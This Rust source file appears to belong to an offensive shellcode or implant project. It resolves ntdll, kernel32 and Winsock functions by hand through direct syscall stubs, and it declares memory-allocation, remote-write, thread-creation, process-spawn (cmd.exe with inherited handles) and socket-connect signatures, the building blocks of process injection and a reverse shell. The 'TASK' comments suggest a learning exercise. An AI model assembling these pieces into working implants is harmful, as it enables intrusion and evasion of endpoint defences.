#[shelly_derive::syscall_impl(
    crate::utils::get_proc_addr,
    crate::syscall::dump_syscall_number_and_addr,
    crate::syscall::make_syscall,
    Ntdll
)]
pub mod ntdll {
    use crate::{nocrt::strlen16, utils::get_module_handle};
    use core::ffi::c_void;
    use windows_sys::{
        Wdk::{Foundation::OBJECT_ATTRIBUTES, Storage::FileSystem::RTL_HEAP_PARAMETERS},
        Win32::{
            Foundation::{HANDLE, NTSTATUS, UNICODE_STRING},
            System::WindowsProgramming::CLIENT_ID,
        },
        core::{BOOL, PWSTR},
        w,
    };

    impl Ntdll {
        const NAME: *const u16 = w!("ntdll.dll");
        pub fn new() -> Self {
            // TASK: Let's understand the code!

            let name = unsafe { core::slice::from_raw_parts(Self::NAME, strlen16(Self::NAME)) };
            let Some(base) = get_module_handle(name) else {
                loop {}
            };
            let nt_protect_virtual_memory = Self::build_NtProtectVirtualMemory(base);
            let nt_allocate_virtual_memory = Self::build_NtAllocateVirtualMemory(base);
            let nt_write_virtual_memory = Self::build_NtWriteVirtualMemory(base);
            let rtl_create_heap = Self::build_RtlCreateHeap(base);
            let rtl_allocate_heap = Self::build_RtlAllocateHeap(base);
            let rtl_free_heap = Self::build_RtlFreeHeap(base);
            let rtl_re_allocate_heap = Self::build_RtlReAllocateHeap(base);
            let ldr_load_dll = Self::build_LdrLoadDll(base);
            let nt_wait_for_single_object = Self::build_NtWaitForSingleObject(base);
            let nt_open_process = Self::build_NtOpenProcess(base);
            let nt_create_thread_ex = Self::build_NtCreateThreadEx(base);

            Self {
                nt_protect_virtual_memory,
                nt_allocate_virtual_memory,
                nt_write_virtual_memory,
                rtl_create_heap,
                rtl_allocate_heap,
                rtl_free_heap,
                rtl_re_allocate_heap,
                ldr_load_dll,
                nt_wait_for_single_object,
                nt_open_process,
                nt_create_thread_ex,
            }
        }
    }

    #[allow(non_snake_case)]
    pub type NtProtectVirtualMemory = unsafe extern "system" fn(
        ProcessHandle: HANDLE,
        BaseAddress: *mut *mut c_void,
        RegionSize: *mut usize,
        NewProtect: u32,
        OldProtect: *mut u32,
    ) -> NTSTATUS;

    #[allow(non_snake_case)]
    pub type NtAllocateVirtualMemory = unsafe extern "system" fn(
        ProcessHandle: HANDLE,
        BaseAddress: *mut *mut c_void,
        ZeroBits: usize,
        RegionSize: *mut usize,
        allocationtype: u32,
        pageprotection: u32,
    ) -> NTSTATUS;

    #[allow(non_snake_case)]
    pub type NtWriteVirtualMemory = unsafe extern "system" fn(
        processhandle: HANDLE,
        baseaddress: *mut c_void,
        buffer: *mut c_void,
        number_of_bytes_to_write: usize,
        number_of_bytes_written: &mut usize,
    ) -> NTSTATUS;

    #[allow(non_snake_case)]
    pub type RtlCreateHeap = unsafe extern "system" fn(
        Flags: u32,
        HeapBase: *mut c_void,
        ReserveSize: usize,
        CommitSize: usize,
        Lock: *mut c_void,
        Parameters: *const RTL_HEAP_PARAMETERS,
    ) -> *mut c_void;

    #[allow(non_snake_case)]
    pub type RtlAllocateHeap = unsafe extern "system" fn(
        heaphandle: *const c_void,
        flags: u32,
        size: usize,
    ) -> *mut c_void;

    #[allow(non_snake_case)]
    pub type RtlFreeHeap = unsafe extern "system" fn(
        heaphandle: *const c_void,
        flags: u32,
        baseaddress: *const c_void,
    ) -> u32;

    #[allow(non_snake_case)]
    pub type RtlReAllocateHeap = unsafe extern "system" fn(
        heaphandle: *const c_void,
        flags: u32,
        baseaddress: *mut c_void,
        size: usize,
    ) -> *mut c_void;

    #[allow(non_snake_case)]
    pub type LdrLoadDll = unsafe extern "system" fn(
        dll_path: PWSTR,
        dll_characteristics: *mut u64,
        dll_name: *const UNICODE_STRING,
        dll_handle: *mut *mut c_void,
    ) -> NTSTATUS;

    /// thread_handle: [in_out]
    /// desired_access: THREAD_ALL_ACCESS
    /// object_attributes: null
    /// process_handle
    /// start_routine: fn
    /// arguments:
    /// create_flags:
    ///
    /// rest default
    #[allow(non_snake_case)]
    pub type NtCreateThreadEx = unsafe extern "system" fn(
        thread_handle: *mut HANDLE,
        desired_access: windows_sys::Win32::System::Threading::THREAD_ACCESS_RIGHTS,
        object_attributes: *mut OBJECT_ATTRIBUTES,
        process_handle: HANDLE,
        start_routine: windows_sys::Win32::System::Threading::LPTHREAD_START_ROUTINE,
        arguments: *mut c_void,
        create_flags: windows_sys::Win32::System::Threading::THREAD_CREATION_FLAGS,
        zero_bits: usize,
        stacksize: usize,
        maximum_stack_size: usize,
        attribute_list: *mut c_void, // PPS_ATTRIBUTE_LIST
    ) -> NTSTATUS;

    #[allow(non_snake_case)]
    pub type NtOpenProcess = unsafe extern "system" fn(
        processhandle: *mut HANDLE,
        desiredaccess: u32,
        objectattributes: *const OBJECT_ATTRIBUTES,
        clientid: *const CLIENT_ID,
    ) -> NTSTATUS;

    #[allow(non_snake_case)]
    pub type NtWaitForSingleObject =
        unsafe extern "system" fn(handle: HANDLE, alertable: BOOL, timeout: *mut i64) -> NTSTATUS;
}

#[shelly_derive::syscall_impl(
    crate::utils::get_proc_addr,
    crate::syscall::dump_syscall_number_and_addr,
    crate::syscall::make_syscall,
    Kernel32
)]
pub mod kernel32 {
    use crate::{nocrt::strlen16, utils::get_module_handle};
    use core::ffi::c_void;
    use windows_sys::{
        Win32::{
            Foundation::HANDLE,
            Security::SECURITY_ATTRIBUTES,
            System::{
                IO::OVERLAPPED,
                Threading::{PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, STARTUPINFOA},
            },
        },
        core::{BOOL, PCSTR, PSTR},
        w,
    };

    impl Kernel32 {
        const NAME: *const u16 = w!("KERNEL32.dll");
        pub fn new() -> Self {
            // TASK: Let's understand the code!
            let name = unsafe { core::slice::from_raw_parts(Self::NAME, strlen16(Self::NAME)) };
            let Some(base) = get_module_handle(name) else {
                loop {}
            };

            let create_process_a = Self::build_CreateProcessA(base);
            let write_file = Self::build_WriteFile(base);

            Self {
                create_process_a,
                write_file,
            }
        }
    }

    /// lpcommandline must be set e.g cmd.exe
    /// binherithandles: true
    /// startupInfo
    /// processinformation zeroed structure
    #[allow(non_snake_case)]
    pub type CreateProcessA = unsafe extern "system" fn(
        lpapplicationname: PCSTR,
        lpcommandline: PSTR,
        lpprocessattributes: *const SECURITY_ATTRIBUTES,
        lpthreadattributes: *const SECURITY_ATTRIBUTES,
        binherithandles: BOOL,
        dwcreationflags: PROCESS_CREATION_FLAGS,
        lpenvironment: *const c_void,
        lpcurrentdirectory: PCSTR,
        lpstartupinfo: *const STARTUPINFOA,
        lpprocessinformation: *mut PROCESS_INFORMATION,
    ) -> BOOL;

    #[allow(non_snake_case)]
    pub type WriteFile = unsafe extern "system" fn(
        hfile: HANDLE,
        lpbuffer: *const u8,
        nnumberofbytestowrite: u32,
        lpnumberofbyteswritten: *mut u32,
        lpoverlapped: *mut OVERLAPPED,
    ) -> BOOL;
}

#[shelly_derive::syscall_impl(
    crate::utils::get_proc_addr,
    crate::syscall::dump_syscall_number_and_addr,
    crate::syscall::make_syscall,
    Ws232
)]
pub mod ws232 {
    use crate::{api::ntdll::Ntdll, nocrt::strlen16};
    use core::ptr::null_mut;
    use windows_sys::{
        Win32::{
            Foundation::{STATUS_SUCCESS, UNICODE_STRING},
            Networking::WinSock::{
                LPWSAOVERLAPPED_COMPLETION_ROUTINE, QOS, SOCKADDR, SOCKET, WSABUF, WSADATA,
                WSAPROTOCOL_INFOA,
            },
            System::IO::OVERLAPPED,
        },
        w,
    };

    impl Ws232 {
        const NAME: *const u16 = w!("Ws2_32.DLL");
        pub fn new(ntdll: &Ntdll) -> Self {
            let len = strlen16(Self::NAME);
            let mut base = null_mut();

            // TASK: Let's understand the code!
            //
            let dll_name = UNICODE_STRING {
                Length: (len * 2) as _,
                MaximumLength: (len * 2 + 2) as _,
                Buffer: Self::NAME.cast_mut(),
            };

            let base = match ntdll.call_LdrLoadDll(null_mut(), null_mut(), &dll_name, &mut base) {
                status if status == STATUS_SUCCESS => base,
                _ => loop {},
            };

            let wsa_startup = Self::build_WSAStartup(base);
            let wsa_socket_a = Self::build_WSASocketA(base);
            let wsa_connect = Self::build_WSAConnect(base);
            let wsa_recv = Self::build_WSARecv(base);

            Self {
                wsa_startup,
                wsa_socket_a,
                wsa_connect,
                wsa_recv,
            }
        }
    }

    pub type WSAStartup =
        unsafe extern "system" fn(wversionrequested: u16, lpwsadata: *mut WSADATA) -> i32;

    /// af: AF_INET
    /// typ: SOCK_STREAM
    /// protocol: IPPROTO_TCP
    ///
    /// Rest can be 0
    pub type WSASocketA = unsafe extern "system" fn(
        af: i32,
        typ: i32,
        protocol: i32,
        lpprotocolinfo: *const WSAPROTOCOL_INFOA,
        g: u32,
        dwflags: u32,
    ) -> SOCKET;

    /// Only the first three parameters must be set
    pub type WSAConnect = unsafe extern "system" fn(
        s: SOCKET,
        name: *const SOCKADDR,
        namelen: i32,
        lpcallerdata: *const WSABUF,
        lpcalleedata: *mut WSABUF,
        lpsqos: *const QOS,
        lpgqos: *const QOS,
    ) -> i32;

    /// Only the first 5 parameters must be set
    #[allow(non_camel_case_types)]
    pub type WSARecv = unsafe extern "system" fn(
        s: SOCKET,
        lpbuffers: *const WSABUF,
        dwbuffercount: u32,
        lpnumberofbytesrecvd: *mut u32,
        lpflags: *mut u32,
        lpoverlapped: *mut OVERLAPPED,
        lpcompletionroutine: LPWSAOVERLAPPED_COMPLETION_ROUTINE,
    ) -> i32;
}
